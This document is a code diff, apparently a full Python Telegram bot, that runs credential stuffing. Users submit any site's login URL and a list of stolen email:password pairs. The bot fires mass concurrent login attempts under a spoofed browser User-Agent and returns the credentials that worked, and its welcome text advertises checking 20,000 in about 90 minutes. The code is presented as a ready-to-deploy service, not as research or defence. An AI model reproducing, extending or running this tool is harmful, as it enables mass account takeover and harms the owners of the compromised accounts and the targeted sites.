@@ -1,0 +1,304 @@
+**⚡ Workflow:**
+1️⃣ Send login URL  
+2️⃣ Upload TXT file
+3️⃣ ✅ Get working creds back!
+
+**⏱️ Performance:**
+• 500 creds: ~10min
+• 20k creds: ~90min
+        """
+        
+        keyboard = [[InlineKeyboardButton("🚀 Start Now", callback_data="begin")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await update.message.reply_text(welcome_msg, parse_mode='Markdown', reply_markup=reply_markup)
+        self.user_states[update.effective_user.id] = {'step': 'waiting_url'}
+
+    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        query = update.callback_query
+        await query.answer()
+        
+        if query.data == "begin":
+            await query.edit_message_text(
+                "🔗 **Send login page URL:**\n\n"
+                "`https://example.com/login`\n"
+                "`https://site.com/auth`",
+                parse_mode='Markdown'
+            )
+
+    async def message_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        user_id = update.effective_user.id
+        
+        # Ensure state exists
+        if user_id not in self.user_states:
+            await update.message.reply_text("👋 Use `/start` first!")
+            return
+        
+        state = self.user_states[user_id]
+        text = update.message.text
+        doc = update.message.document
+        
+        # Step 1: URL
+        if state['step'] == 'waiting_url' and text:
+            url = text.strip()
+            if not self._validate_url(url):
+                await update.message.reply_text("❌ Invalid URL!\nSend like: `https://site.com/login`", parse_mode='Markdown')
+                return
+            
+            state.update({'url': url, 'step': 'waiting_file'})
+            await update.message.reply_text(
+                f"✅ **URL:** `{url}`\n\n📁 **Upload TXT file** 👇",
+                parse_mode='Markdown'
+            )
+            return
+        
+        # Step 2: File
+        if state['step'] == 'waiting_file' and doc:
+            if not doc.file_name or not doc.file_name.endswith('.txt'):
+                await update.message.reply_text("❌ Upload **.txt file** only!")
+                return
+            
+            await self._process_file(update, context, doc)
+            return
+
+    def _validate_url(self, url: str) -> bool:
+        try:
+            parsed = urlparse(url)
+            return parsed.scheme in ('http', 'https') and parsed.netloc
+        except:
+            return False
+
+    async def _process_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE, doc):
+        user_id = update.effective_user.id
+        state = self.user_states[user_id]
+        url = state['url']
+        
+        msg = await update.message.reply_text("📥 Processing file...")
+        
+        try:
+            file_obj = await context.bot.get_file(doc.file_id)
+            content = await file_obj.download_as_bytearray()
+            creds = self._parse_creds(content.decode('utf-8', errors='ignore'))
+            
+            if not creds:
+                await msg.edit_text("❌ No valid credentials found!")
+                return
+            
+            state.update({
+                'creds': creds,
+                'msg_id': msg.message_id,
+                'start_time': datetime.now()
+            })
+            
+            await msg.edit_text(
+                f"🚀 **Starting validation**\n"
+                f"📊 {len(creds):,} credentials\n"
+                f"🌐 {url}\n"
+                f"⚡ {self.max_concurrent} parallel"
+            )
+            
+            asyncio.create_task(self._run_validation(context, user_id, creds, url))
+            
+        except Exception as e:
+            await msg.edit_text(f"❌ Error: {str(e)}")
+            logger.error(f"File error: {e}")
+
+    def _parse_creds(self, content: str) -> List[Credential]:
+        creds = []
+        seps = [';', ':', '|']
+        
+        for line in content.strip().split('\n'):
+            line = line.strip()
+            if len(line) < 10:
+                continue
+            
+            for sep in seps:
+                if sep in line:
+                    email, pwd = line.split(sep, 1)
+                    email, pwd = email.strip(), pwd.strip()
+                    
+                    if '@' in email and '.' in email.split('@')[-1] and len(pwd) > 3:
+                        creds.append(Credential(email, pwd, line))
+                        break
+        
+        return creds
+
+    async def _run_validation(self, context: ContextTypes.DEFAULT_TYPE, user_id: int, 
+                            creds: List[Credential], url: str):
+        self.working_creds = []
+        
+        # Session setup
+        if not self.session:
+            connector = aiohttp.TCPConnector(limit=50, limit_per_host=10)
+            self.session = aiohttp.ClientSession(
+                connector=connector, timeout=self.timeout,
+                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+            )
+        
+        semaphore = asyncio.Semaphore(self.max_concurrent)
+        total = len(creds)
+        
+        # Process in batches
+        for i in range(0, total, 50):
+            batch = creds[i:i+50]
+            tasks = [self._test_cred(semaphore, url, cred) for cred in batch]
+            results = await asyncio.gather(*tasks)
+            
+            working_count = sum(1 for r in results if r)
+            self.working_creds.extend([batch[j] for j, r in enumerate(results) if r])
+            
+            # Progress
+            pct = (i + len(batch)) / total * 100
+            progress = f"📊 {i+len(batch):,}/{total:,} ({pct:.1f}%)\n✅ Working: {len(self.working_creds):,}"
+            
+            await self._update_progress(context, user_id, progress)
+        
+        await self._finish(context, user_id, url)
+
+    async def _test_cred(self, semaphore: asyncio.Semaphore, url: str, cred: Credential) -> bool:
+        async with semaphore:
+            try:
+                return await self._attempt_login(url, cred.email, cred.password)
+            except:
+                return False
+
+    async def _attempt_login(self, base_url: str, email: str, pwd: str) -> bool:
+        endpoints = ['/login', '/auth', '/signin', '/login.php']
+        payloads = [
+            {'email': email, 'password': pwd},
+            {'username': email, 'password': pwd},
+            {'email': email, 'pass': pwd}
+        ]
+        
+        try:
+            for ep in endpoints:
+                login_url = urljoin(base_url, ep)
+                
+                for payload in payloads:
+                    async with self.session.post(login_url, data=payload) as resp:
+                        if resp.status == 200:
+                            text = await resp.text()
+                            success_words = ['dashboard', 'profile', 'account', '"logout"', 'home']
+                            if any(word in text.lower() for word in success_words):
+                                return True
+            
+            return False
+        except:
+            return False
+
+    async def _update_progress(self, context: ContextTypes.DEFAULT_TYPE, user_id: int, text: str):
+        try:
+            state = self.user_states[user_id]
+            await context.bot.edit_message_text(
+                chat_id=user_id, message_id=state['msg_id'],
+                text=f"🔄 {text}", parse_mode='Markdown'
+            )
+        except:
+            pass
+
+    async def _finish(self, context: ContextTypes.DEFAULT_TYPE, user_id: int, url: str):
+        state = self.user_states[user_id]
+        
+        try:
+            await context.bot.delete_message(user_id, state['msg_id'])
+        except:
+            pass
+        
+        total = len(state['creds'])
+        
+        if self.working_creds:
+            file = await self._make_results(url)
+            rate = len(self.working_creds) / total * 100
+            
+            caption = (
+                f"✅ **COMPLETE!**\n\n"
+                f"📊 Processed: {total:,}\n"
+                f"✅ Working: {len(self.working_creds):,}\n"
+                f"📈 Rate: {rate:.1f}%\n\n"
+                f"🌐 {url}"
+            )
+            
+            await context.bot.send_document(
+                chat_id=user_id, document=file,
+                caption=caption, parse_mode='Markdown'
+            )
+        else:
+            await context.bot.send_message(
+                user_id, "❌ No working credentials found!", 
+                parse_mode='Markdown'
+            )
+        
+        del self.user_states[user_id]
+
+    async def _make_results(self, url: str) -> BytesIO:
+        ts = datetime.now().strftime("%Y%m%d_%H%M")
+        content = f"# Working Creds - {url}\n# {datetime.now()}\n\n"
+        
+        for cred in self.working_creds:
+            content += f"{cred.original_line}\n"
+        
+        if len(self.working_creds) > 50:
+            # ZIP
+            zfile = BytesIO()
+            with zipfile.ZipFile(zfile, 'w') as zf:
+                zf.writestr(f'working_{ts}.txt', content)
+            zfile.seek(0)
+            return zfile
+        else:
+            tfile = BytesIO(content.encode())
+            tfile.seek(0)
+            return tfile
+
+    async def shutdown(self):
+        if self.session:
+            await self.session.close()
+
+# === MAIN ===
+async def main():
+    if not TELEGRAM_TOKEN:
+        print("❌ TELEGRAM_BOT_TOKEN required!")
+        return
+    
+    print("🚀 Starting Credential Validator Bot...")
+    
+    app = Application.builder().token(TELEGRAM_TOKEN).build()
+    bot = CredentialValidatorBot(TELEGRAM_TOKEN)
+    
+    # Handlers
+    app.add_handler(CommandHandler("start", bot.start))
+    app.add_handler(CallbackQueryHandler(bot.button_handler))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.message_handler))
+    app.add_handler(MessageHandler(filters.Document.ALL, bot.message_handler))
+    
+    print("✅ Bot ready! Deployed on Railway 🚀")
+    
+    await app.initialize()
+    await app.start()
+    await app.updater.start_polling(drop_pending_updates=True)
+    
+    # Railway healthcheck
+    import threading
+    def healthcheck():
+        from http.server import HTTPServer, BaseHTTPRequestHandler
+        class Handler(BaseHTTPRequestHandler):
+            def do_GET(self):
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b"Bot healthy!")
+        server = HTTPServer(('0.0.0.0', 8080), Handler)
+        server.serve_forever()
+    
+    threading.Thread(target=healthcheck, daemon=True).start()
+    
+    try:
+        # Keep running
+        while True:
+            await asyncio.sleep(1)
+    except KeyboardInterrupt:
+        print("\n🛑 Shutting down...")
+    finally:
+        await app.stop()
+        await bot.shutdown()
+
+if __name__ == '__main__':
+    asyncio.run(main())
